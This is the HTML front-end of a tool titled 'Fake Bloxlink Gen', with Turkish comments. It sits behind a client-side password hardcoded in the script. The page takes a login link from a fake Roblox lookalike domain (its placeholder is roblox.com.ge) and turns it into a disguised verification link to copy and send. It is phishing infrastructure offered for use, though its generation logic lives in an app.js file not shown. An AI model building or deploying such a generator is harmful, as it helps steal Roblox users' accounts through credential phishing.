<!DOCTYPE html>
<html lang="en">
<!--iDom-->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Fake Bloxlink Gen</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Aynı stiller (öncekiyle aynı) */
        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 200% 0; }
        }
        @keyframes pushDown {
            0% { transform: translateY(-20px); opacity: 0; max-height: 0; margin-top: 0; }
            100% { transform: translateY(0); opacity: 1; max-height: 200px; margin-top: 1.25rem; }
        }
        @keyframes slideIn {
            0% { transform: translateY(-10px); opacity: 0; }
            100% { transform: translateY(0); opacity: 1; }
        }
        @keyframes typeWriter {
            0% { width: 0; }
            100% { width: 100%; }
        }
        @keyframes fadeInUp {
            0% { opacity: 0; transform: translateY(20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 5px rgba(255, 255, 255, 0.3); }
            50% { text-shadow: 0 0 20px rgba(255, 255, 255, 0.6), 0 0 30px rgba(255, 255, 255, 0.4); }
        }
        .shine-text {
            background: linear-gradient(100deg, #ffffff 45%, #c4c0c0 50%, #ffffff 55%);
            background-size: 200% auto;
            color: transparent;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shine 4s linear infinite;
        }
        #loginUrl {
            color: white !important;
        }
        #loginUrl::placeholder {
            color: rgba(255, 255, 255, 0.5) !important;
            user-select: none !important;
            -webkit-user-select: none !important;
            -moz-user-select: none !important;
            -ms-user-select: none !important;
            pointer-events: none !important;
        }
        #loginUrl:focus::placeholder {
            opacity: 0.3 !important;
        }
        .push-down-enter {
            animation: pushDown 0.5s ease-out forwards;
            overflow: hidden;
        }
        .slide-in {
            animation: slideIn 0.3s ease-out forwards;
        }
        #resultSection {
            transition: all 0.3s ease;
        }
        #resultSection.show {
            animation: pushDown 0.5s ease-out forwards;
        }
        .typewriter {
            overflow: hidden;
            white-space: nowrap;
            animation: typeWriter 1.5s steps(40, end) forwards;
        }
        .fade-in-up {
            animation: fadeInUp 0.6s ease-out forwards;
        }
        .pulse-text {
            animation: pulse 2s ease-in-out infinite;
        }
        .glow-text {
            animation: glow 2s ease-in-out infinite;
        }
        .stagger-1 { animation-delay: 0.1s; }
        .stagger-2 { animation-delay: 0.2s; }
        .stagger-3 { animation-delay: 0.3s; }
        .loading-dots::after {
            content: '';
            animation: loadingDots 1.5s infinite;
        }
        @keyframes loadingDots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
        .success-text {
            animation: fadeInUp 0.5s ease-out forwards, glow 1s ease-in-out 2;
        }
        /* Şifre formu stilleri */
        #passwordOverlay {
            position: fixed;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0,0,0,0.85);
            z-index: 9999;
        }
        #passwordOverlay .box {
            background: #1a1a1a;
            padding: 2rem;
            border-radius: 1rem;
            max-width: 400px;
            width: 90%;
            border: 1px solid #333;
            text-align: center;
        }
        #passwordOverlay .box h2 {
            color: #fff;
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }
        #passwordOverlay .box input {
            width: 100%;
            padding: 0.75rem;
            border-radius: 0.5rem;
            border: 1px solid #444;
            background: #111;
            color: #fff;
            font-size: 1rem;
            margin-bottom: 1rem;
        }
        #passwordOverlay .box button {
            width: 100%;
            padding: 0.75rem;
            border: none;
            border-radius: 0.5rem;
            background: #10b981;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        #passwordOverlay .box button:hover {
            background: #059669;
        }
        #passwordOverlay .box .error {
            color: #ef4444;
            margin-top: 0.5rem;
            font-size: 0.9rem;
        }
        @media (max-width: 768px) {
            .min-h-screen {
                min-height: 100vh;
                min-height: -webkit-fill-available;
            }
            body {
                min-height: 100vh;
                min-height: -webkit-fill-available;
            }
            .mt-[-10%] {
                margin-top: 0 !important;
            }
            .flex-col {
                gap: 0.75rem !important;
            }
            #loginUrl {
                font-size: 16px !important;
                padding: 0.875rem !important;
                min-height: 44px !important;
            }
            button {
                min-height: 44px !important;
                padding: 0.875rem 1rem !important;
                font-size: 16px !important;
            }
            .text-lg, .text-xl {
                font-size: 1.125rem !important;
            }
            .p-4 {
                padding: 1rem !important;
            }
            code {
                font-size: 14px !important;
                word-break: break-all !important;
                line-height: 1.4 !important;
            }
            #domainsList {
                font-size: 11px !important;
                line-height: 1.3 !important;
            }
        }
        @supports (-webkit-touch-callout: none) {
            #loginUrl {
                font-size: 16px !important;
            }
        }
    </style>
</head>

<body class="bg-black text-white">
    <!-- Arka plan efektleri -->
    <div class="absolute inset-0 -z-10 h-full w-full bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div>
    <div class="absolute top-0 z-[-2] h-screen w-full bg-[radial-gradient(ellipse_60%_60%_at_50%_-20%,rgba(120,119,198,0.3),rgba(255,255,255,0))]"></div>

    <!-- Şifre Giriş Overlay -->
    <div id="passwordOverlay">
        <div class="box">
            <h2>🔐 Giriş</h2>
            <p style="color:#9ca3af; margin-bottom:1rem;">Bu sayfaya erişmek için şifre girin.</p>
            <input type="password" id="passwordInput" placeholder="Şifre">
            <button id="passwordSubmit">Giriş Yap</button>
            <div id="passwordError" class="error" style="display:none;">❌ Hatalı şifre, tekrar deneyin.</div>
        </div>
    </div>

    <!-- Ana içerik (başlangıçta gizli) -->
    <div id="mainContent" style="display:none;">
        <div class="flex min-h-screen items-center justify-center p-4">
            <div class="w-full max-w-2xl text-center mt-[-10%] sm:mt-0">
                <div class="flex items-center justify-center">
                    <div class="p-4 sm:p-[16px] bg-black/30 border border-white/10 rounded-lg w-full max-w-full">
                        <span class="self-center text-lg sm:text-xl font-semibold text-white shine-text text-center fade-in-up">
                            Fake Bloxlink Gen
                        </span>

                        <div>
                            <div class="mt-5">
                                <div class="flex items-center gap-2 mb-2">
                                    <label for="loginUrl" class="block text-sm font-medium text-white/80 text-left">
                                        Login URL
                                    </label>
                                    <div class="relative group">
                                        <span class="text-xs text-white/60 hover:text-white/80 cursor-help transition-colors underline decoration-dotted underline-offset-2">
                                            what is this?
                                        </span>
                                        <div class="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 px-3 py-2 bg-zinc-800 text-white text-xs rounded-lg shadow-lg opacity-0 group-hover:opacity-100 transition-opacity duration-200 pointer-events-none z-10 border border-white/10 w-64 sm:w-80 max-w-[calc(100vw-2rem)]">
                                            <div class="text-center">
                                                <div class="font-medium mb-1">u stupid</div>
                                                <div class="text-white/80">Click login on a fake profile, group or private server and paste the link here. (must be on a supported domain)</div>
                                            </div>
                                            <div class="absolute top-full left-1/2 transform -translate-x-1/2 w-0 h-0 border-l-4 border-r-4 border-t-4 border-transparent border-t-zinc-800"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="flex flex-col sm:flex-row gap-2 items-stretch sm:items-center bg-zinc-900 rounded-lg p-2 w-full">
                                    <input id="loginUrl"
                                        class="bg-transparent outline-none text-sm md:text-base text-white pl-3 flex-1 min-w-0"
                                        placeholder="https://roblox.com.ge/login?returnUrl=..." size="40">
                                    <button id="convertBtn"
                                        class="bg-zinc-900 px-4 py-2 rounded-lg hover:bg-zinc-700 transition-colors flex items-center justify-center gap-2 whitespace-nowrap">
                                        <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" stroke="#ffffff"
                                                stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
                                        </svg>
                                        Create
                                    </button>
                                </div>
                            </div>
                        </div>

                        <!-- Result section -->
                        <div id="resultSection" class="hidden mt-5">
                            <label class="block text-sm font-medium text-white/80 mb-2 text-left">
                                Result
                            </label>
                            <div class="flex flex-col sm:flex-row gap-2 items-stretch sm:items-center bg-zinc-900 rounded-lg p-2 w-full">
                                <code id="resultUrl" class="bg-transparent text-sm md:text-base text-white/70 pl-3 flex-1 text-left font-mono break-all min-w-0"></code>
                                <button id="copyBtn"
                                    class="bg-zinc-900 px-4 py-2 rounded-lg hover:bg-zinc-700 transition-colors flex items-center justify-center gap-2 whitespace-nowrap">
                                    <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
                                            stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
                                    </svg>
                                    Copy
                                </button>
                            </div>
                        </div>

                        <p class="self-center text-sm font-semibold whitespace-nowrap text-red-500 mt-3" id="errorText"></p>

                        <div class="mt-5 text-xs text-white/40 text-left">
                            <div class="mb-2">
                                <span class="text-white/60">Supported Domains:</span>
                            </div>
                            <div id="domainsList" class="text-white/50 font-mono break-all">
                                <span class="loading-dots pulse-text">Loading domains</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="app.js"></script>
    <script>
        // Şifre kontrolü
        (function() {
            const PASSWORD = 'mamim1234';
            const overlay = document.getElementById('passwordOverlay');
            const passwordInput = document.getElementById('passwordInput');
            const passwordSubmit = document.getElementById('passwordSubmit');
            const passwordError = document.getElementById('passwordError');
            const mainContent = document.getElementById('mainContent');

            function checkPassword() {
                const entered = passwordInput.value.trim();
                if (entered === PASSWORD) {
                    overlay.style.display = 'none';
                    mainContent.style.display = 'block';
                    // Sayfa yüklendiğinde app.js'nin çalışması için event tetikle
                    if (typeof initApp === 'function') {
                        initApp();
                    } else {
                        // app.js yüklendikten sonra DOMContentLoaded tekrar tetiklenmez, manuel başlat
                        document.dispatchEvent(new Event('DOMContentLoaded'));
                    }
                } else {
                    passwordError.style.display = 'block';
                    passwordInput.value = '';
                    passwordInput.focus();
                }
            }

            passwordSubmit.addEventListener('click', checkPassword);
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    checkPassword();
                }
            });

            // Başlangıçta inputa odaklan
            passwordInput.focus();
        })();
    </script>
</body>
</html>
